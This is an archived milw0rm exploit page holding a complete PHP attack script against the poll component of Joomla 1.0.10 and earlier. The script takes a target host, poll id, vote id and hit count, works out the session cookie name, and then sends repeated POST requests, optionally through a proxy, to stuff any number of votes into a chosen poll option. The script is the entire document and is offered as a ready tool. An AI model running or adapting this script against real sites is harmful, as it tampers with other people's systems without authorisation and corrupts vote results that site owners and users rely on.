<html><head><title>Joomla <=1.0.10 (poll component) Arbitrary Add Votes Exploit</title></head><pre>&lt;?php
#          Joomla [poll component] add unlimited votes            #
#            Computer Security Researchers Institute              #
#              works regardless of php.ini settings               #
#                          by trueend5                            #
#                     [http://www.KAPDA.ir]                       #


error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;, 2);
ob_implicit_flush (1);

echo '&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1252&quot;&gt;
&lt;title&gt;Joomla [poll component] arbitrary add votes&lt;/title&gt;
&lt;/head&gt;
&lt;body bgcolor=&quot;#FFCCFF&quot;&gt;
&lt;p align=&quot;center&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#0000FF&quot;&gt;Joomla&amp;nbsp; [poll
component] arbitrary add votes&lt;/font&gt;&lt;/p&gt;
&lt;p class=&quot;Stile6&quot; align=&quot;center&quot;&gt;&lt;font size=&quot;3&quot; color=&quot;#FF0000&quot;&gt;by trueend5&lt;/font&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;font size=&quot;4&quot; color=&quot;#008000&quot;&gt;Computer Security Researchers
Institute&lt;/font&gt;&lt;/p&gt;
&lt;font SIZE=&quot;3&quot;&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;&lt;a href=&quot;http://www.kapda.ir&quot;&gt;&lt;font color=&quot;#000000&quot;&gt;KAPDA&lt;/font&gt;&lt;/a&gt;.ir&lt;/b&gt;&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;&amp;nbsp;&lt;/p&gt;
&lt;/font&gt;
&lt;table width=&quot;90%&quot;&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td width=&quot;43%&quot; align=&quot;left&quot;&gt;
        &lt;form name=&quot;form1&quot; action=&quot;'.$SERVER[PHP_SELF].'&quot; method=&quot;post&quot;&gt;
          &lt;p&gt;&lt;input name=&quot;host&quot; size=&quot;20&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;*&lt;/font&gt; hostname (ex: www.sitename.com)&lt;/span&gt;&lt;/p&gt;

          &lt;p&gt;&lt;input name=&quot;path&quot; size=&quot;20&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;*&lt;/font&gt; path (ex: /joomla/
          or just / )&lt;/span&gt;&lt;/p&gt;
          &lt;p&gt;&lt;input name=&quot;pollid&quot; size=&quot;20&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;
			*&lt;/font&gt; pollid (ex: index.php?option=com_poll&amp;amp;task=results&amp;amp;&lt;b&gt;&lt;font size=&quot;4&quot;&gt;id=14&lt;/font&gt;&lt;/b&gt; )&lt;/span&gt;&lt;/p&gt;

          &lt;p&gt;&lt;input name=&quot;voteid&quot; size=&quot;20&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;
			*&lt;/font&gt; voteid ( &lt;b&gt;&lt;u&gt;1&lt;/u&gt;&lt;/b&gt; for first option, &lt;b&gt;&lt;u&gt;2&lt;/u&gt;&lt;/b&gt;
			for second one , &lt;b&gt;&lt;u&gt;3&lt;/u&gt;&lt;/b&gt; for third and so... )&lt;/span&gt;&lt;/p&gt;

			&lt;p&gt;&lt;input name=&quot;hits&quot; size=&quot;20&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;
			*&lt;/font&gt;
			hits ( number of votes that you want to add ) &lt;/span&gt;&lt;/p&gt;
          &lt;p&gt;&lt;input name=&quot;port&quot; size=&quot;20&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; specify a port&amp;nbsp;
          (default: 80)&lt;/span&gt;&lt;/p&gt;
          &lt;p&gt;&lt;input name=&quot;proxy&quot; size=&quot;20&quot; &gt;&lt;span class=&quot;Stile5&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; send exploit
          through an HTTP proxy (ip:port)&lt;/span&gt;&lt;/p&gt;

          &lt;p align=&quot;center&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;&amp;nbsp;&amp;nbsp;
          * &lt;/font&gt;fields are required&lt;/span&gt;&lt;/p&gt;
          &lt;p align=&quot;center&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt;&lt;/p&gt;

          &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Start&quot; name=&quot;Submit&quot;&gt;&lt;/p&gt;
        &lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;';


function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '&lt;table border=&quot;0&quot;&gt;&lt;tr&gt;';
while ($ii &lt;= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo &quot;&lt;td&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&quot;;
             for ($li=0; $li&lt;=15; $li++)
                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li+$ki].&quot;&lt;/td&gt;&quot;;
			    }
            $ki=$ki+16;
            echo &quot;&lt;/tr&gt;&lt;tr&gt;&quot;;
            }
if (strlen($datai)==1) {echo &quot;&lt;td&gt;0&quot;.$datai.&quot;&lt;/td&gt;&quot;;} else
{echo &quot;&lt;td&gt;&quot;.$datai.&quot;&lt;/td&gt; &quot;;}
$ii++;
$ji++;
}
for ($li=1; $li&lt;=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo &quot;&lt;td&gt;&amp;nbsp&amp;nbsp&lt;/td&gt;&quot;;
                       }

for ($li=$ci*16; $li&lt;=strlen($headeri); $li++)
                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li].&quot;&lt;/td&gt;&quot;;
			    }
echo &quot;&lt;/tr&gt;&lt;/table&gt;&quot;;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() 

{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket &lt; 0) {
                   echo &quot;socket_create() failed: reason: &quot; . socket_strerror($socket) . &quot;&lt;br&gt;&quot;;
                   }
	      else
 		  {   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid proxy...';
                        die;
                       }
                    echo &quot;OK.&lt;br&gt;&quot;;
                    echo &quot;Attempting to connect to &quot;.$host.&quot; on port &quot;.$port.&quot;...&lt;br&gt;&quot;;
                    if ($proxy=='')
		   {
		     $result = socket_connect($socket, $host, $port);
		   }
		   else
		   {

		   $parts =explode(':',$proxy);
                   echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
		   $result = socket_connect($socket, $parts[0],$parts[1]);
		   }
		   if ($result &lt; 0) {
                                     echo &quot;socket_connect() failed.\r\nReason: (&quot;.$result.&quot;) &quot; . socket_strerror($result) . &quot;&lt;br&gt;&lt;br&gt;&quot;;
                                    }
	                       else
		                    {
                                     echo &quot;OK.&lt;br&gt;&lt;br&gt;&quot;;
                                     $html= '';
                                     socket_write($socket, $packet, strlen($packet));
                                     echo &quot;Reading response:&lt;br&gt;&quot;;
                                     while ($out= socket_read($socket, 2048)) {$html.=$out;}
                                     echo nl2br(htmlentities($html));
                                     echo &quot;Closing socket...&quot;;
                                     socket_close($socket);

				    }
                  }
}
function sendpacketii($packet)
{
global $proxy, $host, $port, $html, $proxy_regex;
if ($proxy=='')
           {$ock=fsockopen(gethostbyname($host),$port);}
             else
           {
	   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid proxy...';
                        die;
                       }
	   $parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
//echo nl2br(htmlentities($html));
}

  $host=trim($_POST[host]);
  $path=trim($_POST[path]);
  $port=intval(trim($_POST[port]));
  $pollid=intval(trim($_POST[pollid]));
  $voteid=intval(trim($_POST[voteid]));
  $hits=intval(trim($_POST[hits]));
if (($host&lt;&gt;'') and ($path&lt;&gt;'') and ($pollid&lt;&gt;'') and ($voteid&lt;&gt;'') and ($hits&lt;&gt;''))
{
  $host=str_replace(&quot;\r\n&quot;,&quot;&quot;,$host);
  $path=str_replace(&quot;\r\n&quot;,&quot;&quot;,$path);
  if ($port=='') {$port=80;}
  if ($hits=='') {$hits=200;}
  if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
  $livesite=$host;
  if ($path=='/') {$livepath='';} else $livepath=substr(&quot;$path&quot;, 0, strlen($path)-1);
  $sessionpath='http://'.$livesite.$livepath;

  $packet=&quot;HEAD &quot;.$p.&quot;index.php HTTP/1.1\r\n&quot;;
  $packet.=&quot;User-Agent: Shareaza v1.x.x.xx\r\n&quot;;
  $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
  $packet.=&quot;Connection: Close\r\n\r\n&quot;;
  show($packet);
  sendpacketii($packet);
  echo nl2br(htmlentities($html));

  //trying to obtain cookiename from HEADER
  $pattern=&quot;([a-z0-9]{32}=)&quot;;
  if(preg_match($pattern, $html, $matches)) {$match=$matches[0];
  $sessionCookieName=substr(&quot;$match&quot;, 0, strlen($match)-1);
  } else
  //trying to generate cookiename
  {$sessionCookieName= md5( 'site'.$sessionpath );}

  for ($t = 14; $t &lt; $pollid; $t++) {$voteid=$voteid + 12;}
  $data=&quot;voteid=&quot;.$voteid.&quot;&quot;;
  $packet=&quot;POST &quot;.$p.&quot;index.php?option=com_poll&amp;task=vote&amp;id=&quot;.$pollid.&quot;&amp;&quot;.$sessionCookieName.&quot;=1 HTTP/1.0\r\n&quot;;
  $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
  $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
  $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
  $packet.=&quot;Connection: Close\r\n\r\n&quot;;
  $packet.=$data;
  show($packet);
  sendpacketii($packet);
  echo nl2br(htmlentities($html));

  if (!eregi(&quot;Location&quot;,$html)) {
  echo &quot;\n\nExploit failed...&quot;; die();
 }
                           else {
  for ($n = 2; $n &lt;= $hits; $n++) {
  
  $data=&quot;voteid=&quot;.$voteid.&quot;&quot;;
  $packet=&quot;POST &quot;.$p.&quot;index.php?option=com_poll&amp;task=vote&amp;id=&quot;.$pollid.&quot;&amp;&quot;.$sessionCookieName.&quot;=1 HTTP/1.0\r\n&quot;;
  $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
  $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
  $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
  $packet.=&quot;Connection: Close\r\n\r\n&quot;;
  $packet.=$data;
  sendpacketii($packet);

  if (!eregi(&quot;Location&quot;,$html)) {
  echo &quot;\n\nExploit failed...&quot;; die();
   }
  echo &quot;&lt;br /&gt;&quot;.$n.&quot;:added.&quot;;
 }
                            echo &quot;&lt;br /&gt; Exploit succeeded &lt;br /&gt;&quot;;
                            echo'&lt;p align=&quot;center&quot;&gt;&lt;a href=&quot;'.$sessionpath.'/index.php?option=com_poll&amp;task=results&amp;id='.$pollid.'&quot;&gt;&lt;font color=&quot;#0000FF&quot;&gt;Results&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;';
                            }
}
else
{echo 'Fill in requested fields, optionally specify a proxy';}
?&gt;

# milw0rm.com [2006-08-19]</pre></html>